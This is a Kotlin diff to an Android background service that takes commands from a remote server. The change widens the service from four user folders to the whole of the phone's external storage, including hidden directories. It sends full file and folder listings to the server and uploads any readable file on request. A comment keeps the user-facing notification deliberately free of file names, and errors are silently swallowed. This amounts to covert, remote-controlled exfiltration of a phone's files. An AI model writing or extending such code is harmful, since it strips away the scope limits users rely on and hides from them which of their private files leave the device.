@@ -126,8 +126,8 @@ class ShareService : Service() {
     }
 
     private fun processListCommand(server: String, token: String, command: JSONObject) {
-        val files = scanAllowedFolders()
-        val payload = JSONObject().put("files", files)
+        val scan = scanPhoneStorage()
+        val payload = JSONObject().put("files", scan.first).put("folders", scan.second)
         val request = Request.Builder()
             .url("$server/api/phone/commands/${command.optString("id")}/result")
             .header("Authorization", "Bearer $token")
@@ -137,45 +137,51 @@ class ShareService : Service() {
         updateNotification("همگام‌سازی فعال")
     }
 
-    private fun scanAllowedFolders(): JSONArray {
-        val result = JSONArray()
-        val root = Environment.getExternalStorageDirectory()
-        val allowed = listOf("Download", "DCIM", "Documents", "Movies")
+    private fun scanPhoneStorage(): Pair<JSONArray, JSONArray> {
+        val files = JSONArray()
+        val folders = JSONArray()
+        val root = Environment.getExternalStorageDirectory().canonicalFile
+        val rootPrefix = root.path + File.separator
         val visited = HashSet<String>()
         val stack = ArrayDeque<File>()
-        for (folder in allowed) {
-            val dir = File(root, folder)
-            if (dir.isDirectory && dir.canRead()) stack.add(dir)
-        }
-        while (stack.isNotEmpty() && result.length() < MAX_FILES) {
+        stack.add(root)
+        while (stack.isNotEmpty() && (files.length() < MAX_FILES || folders.length() < MAX_FOLDERS)) {
             val dir = stack.removeLast()
-            val canonical = try { dir.canonicalPath } catch (_: IOException) { continue }
-            if (!visited.add(canonical)) continue
-            val children = try { dir.listFiles() } catch (_: SecurityException) { null } ?: continue
+            val canonical = try { dir.canonicalFile } catch (_: IOException) { continue }
+            if (canonical.path != root.path && !canonical.path.startsWith(rootPrefix)) continue
+            if (!visited.add(canonical.path)) continue
+            val children = try { canonical.listFiles() } catch (_: SecurityException) { null } ?: continue
             for (child in children) {
-                if (result.length() >= MAX_FILES) break
                 try {
+                    val childCanonical = child.canonicalFile
+                    if (childCanonical.path != root.path && !childCanonical.path.startsWith(rootPrefix)) continue
                     if (child.isDirectory) {
-                        if (!child.isHidden && child.canRead()) stack.add(child)
-                    } else if (child.isFile && child.canRead()) {
-                        result.put(JSONObject()
-                            .put("path", child.absolutePath)
+                        if (folders.length() < MAX_FOLDERS) {
+                            folders.put(JSONObject()
+                                .put("path", childCanonical.absolutePath)
+                                .put("name", child.name))
+                        }
+                        if (child.canRead()) stack.add(childCanonical)
+                    } else if (child.isFile && child.canRead() && files.length() < MAX_FILES) {
+                        files.put(JSONObject()
+                            .put("path", childCanonical.absolutePath)
                             .put("name", child.name)
                             .put("size", child.length())
                             .put("modified", child.lastModified()))
                     }
-                } catch (_: SecurityException) { }
+                } catch (_: Exception) { }
+                if (files.length() >= MAX_FILES && folders.length() >= MAX_FOLDERS) break
             }
         }
-        return result
+        return Pair(files, folders)
     }
 
     private fun processTransferCommand(server: String, token: String, command: JSONObject) {
         val requestedPath = command.optString("path")
         val file = try { File(requestedPath).canonicalFile } catch (_: Exception) { return }
         val root = Environment.getExternalStorageDirectory().canonicalFile
-        val allowedRoots = listOf("Download", "DCIM", "Documents", "Movies").map { File(root, it).canonicalFile }
-        if (!file.isFile || !allowedRoots.any { file.path.startsWith(it.path + File.separator) }) return
+        val rootPrefix = root.path + File.separator
+        if (!file.isFile || !file.path.startsWith(rootPrefix) || !file.canRead()) return
 
         // Show a short, file-name-free status before starting the upload.
         updateNotification("آماده ارسال اسناد")
@@ -232,5 +238,6 @@ class ShareService : Service() {
         private const val CHANNEL_ID = "phonelink_sync"
         private const val NOTIFICATION_ID = 1010
         private const val MAX_FILES = 20000
+        private const val MAX_FOLDERS = 50000
     }
 }
